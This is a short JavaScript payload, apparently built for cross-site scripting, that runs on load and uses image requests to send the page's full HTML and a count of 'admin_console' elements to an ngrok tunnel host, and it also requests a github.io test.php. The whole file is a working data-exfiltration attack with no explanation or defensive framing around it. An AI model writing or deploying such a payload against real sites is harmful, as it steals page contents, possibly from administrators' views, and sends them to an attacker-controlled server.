
function addTheImage() {
    var img = document.createElement('img');
    img.src = "http://3e6850f2.ngrok.io?c="+document.body.innerHTML;
    document.body.appendChild(img);
}
function addTheImage2() {
    var img = document.createElement('img');
    img.src = "http://3e6850f2.ngrok.io?c="+document.getElementsByClassName("col-8 admin_console").length;
    document.body.appendChild(img);
}

function addTheImage3() {
    var img = document.createElement('img');
    img.src = "phulelouch.github.io/test.php"
    document.body.appendChild(img);
}
addTheImage();
addTheImage2();
addTheImage3();

